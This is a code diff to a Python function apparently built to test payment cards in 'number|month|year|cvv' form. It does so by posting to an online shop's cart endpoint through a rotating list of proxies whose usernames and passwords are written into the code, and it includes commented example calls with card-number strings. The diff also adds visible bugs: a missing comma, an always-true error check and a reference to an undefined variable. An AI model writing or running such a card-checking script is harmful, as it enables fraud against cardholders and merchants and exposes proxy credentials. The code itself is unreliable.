@@ -10,8 +10,17 @@ def vbv(ccx):
     session = requests.Session()
 
     proxies = [
-    
-    "http://NFNmXMmY2PEtCktkfKzwhb4C:SAMA_698940@ca-mon.pvdata.host:8080"
+    "http://geonode_QTpdEN0Dp8-type-residential:45228052-28d8-429b-83ed-41588beb1664@proxy.geonode.io:9000",
+    "http://geonode_QTpdEN0Dp8-type-residential:45228052-28d8-429b-83ed-41588beb1664@proxy.geonode.io:9000",
+    "http://geonode_QTpdEN0Dp8-type-residential:45228052-28d8-429b-83ed-41588beb1664@proxy.geonode.io:9000",
+    "http://geonode_QTpdEN0Dp8-type-residential:45228052-28d8-429b-83ed-41588beb1664@proxy.geonode.io:9000",
+    "http://geonode_QTpdEN0Dp8-type-residential:45228052-28d8-429b-83ed-41588beb1664@proxy.geonode.io:9000",
+    "http://geonode_QTpdEN0Dp8-type-residential:45228052-28d8-429b-83ed-41588beb1664@proxy.geonode.io:9000",
+    "http://geonode_QTpdEN0Dp8-type-residential:45228052-28d8-429b-83ed-41588beb1664@proxy.geonode.io:9000",
+    "http://geonode_QTpdEN0Dp8-type-residential:45228052-28d8-429b-83ed-41588beb1664@proxy.geonode.io:9000"
+    "http://799JRELTBPAE:F7BQ7D3EQSQA@175.29.133.8:5433",
+    "http://ZVBUHmrp:jjNybrx6@uk4gserver55.ddns.net:8005",
+    "http://NFNmXMmY2PEtCktkfKzwhb4C:SAMA_698940@ca-mon.pvdata.host:8080",
 ]
     # Choose one proxy randomly
     chosen_proxy = random.choice(proxies)
@@ -53,11 +62,11 @@ def vbv(ccx):
     try:
         response = session.post('https://paxam.shop/cart/add', headers=headers, data=data)
     except requests.exceptions.ProxyError as e:
-        if "402" in str(e):
+        if "402" or '407' in str(e):
             print("402 payment required")
             return "402 proxy payment required"
         else:
-            raise
+            return response.text
        # print(response.text)
 
 
@@ -783,5 +792,5 @@ def vbv(ccx):
             return response.text
 
             
-#print(vbv("4649519909010371|05|29|071"))                                     
+#print(vbv("4031390006273585|11|26|824"))                                     
 # Example usage
